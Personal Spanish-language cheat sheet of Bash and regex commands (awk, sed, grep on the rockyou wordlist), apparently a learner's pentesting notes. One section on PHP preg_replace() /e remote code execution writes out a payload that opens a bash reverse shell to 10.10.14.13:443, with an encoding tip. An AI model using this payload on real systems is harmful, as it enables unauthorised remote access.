# Bash 

Tags: #Bashshell #Regex

```bash 
❯ https://regex101.com/     # Practicar las Regex
❯ https://regexr.com/       # Practicar las Regex
❯ https://cheatography.com/davechild/cheat-sheets/regular-expressions/   # Cheat Sheet
```

```bash
❯ bash script.sh            # Ejecutar un script sin permisos de ejecución
❯ ./script.sh               # Ejecutar un script con permisos de ejecución 
```

## Regex Dangers 'preg_replace()' RCE

* [Preg_replace()](https://captainnoob.medium.com/command-execution-preg-replace-php-function-exploit-62d6f746bda4)

```bash 
❯ /addr*/      # Empieza por 'addr' y continua con lo que sea 
❯ /i           # Case insensitive 

❯ /e           # Agregar código PHP
	❯ system("whoami")     # Mirar el nombre del usuario
	❯ system("bash -c 'bash -i >& /dev/tcp/10.10.14.13/443 0>&1'") 
		# Urlencodear el & = %26 
```

## Regex

```bash
# Cuando recibimos un output, podemos mostrar solo el segundo argumento 

❯ awk '{print $2}' FS=":"

	# awk = # Al momento de filtrar, le podemos decir que nos queremos quedar con el segundo argumento
	# FS = El delimitador son los ':'
	
❯ awk '{print $1}' FS="<"         # Filtrar el primer argumento (izquierda a derecha), tomando el simbolo '<' como delimitador 

❯ awk 'NF{print $NF}'             # Filtrar el ultimo argumento
```

```bash
❯ sed 's/^ *//'                   # Sustituimos el espaciado al principio de un otuput por 'nada'

	# Todo lo que inicie con un espacio seguido de 'nada', lo quite 

❯ sed 's/omar/amor'               # Sustituyes la palabra 'omar' por 'amor'
```

```bash 
❯ grep -oP '^amor.*' /usr/share/wordlists/rockyou.txt     # Listamos la palabra 

	# ^ = Indicamos que inicie con la palabra 'amor'
	# .* = Indicamos que termine con lo que sea

❯ grep -oP '.*amor$' /usr/share/wordlists/rockyou.txt     # Listamos la palabra 

	# .* = Indicamos que inicie con lo que sea 
	# $ = Indicamos que finalice con la palabra 'amor'
```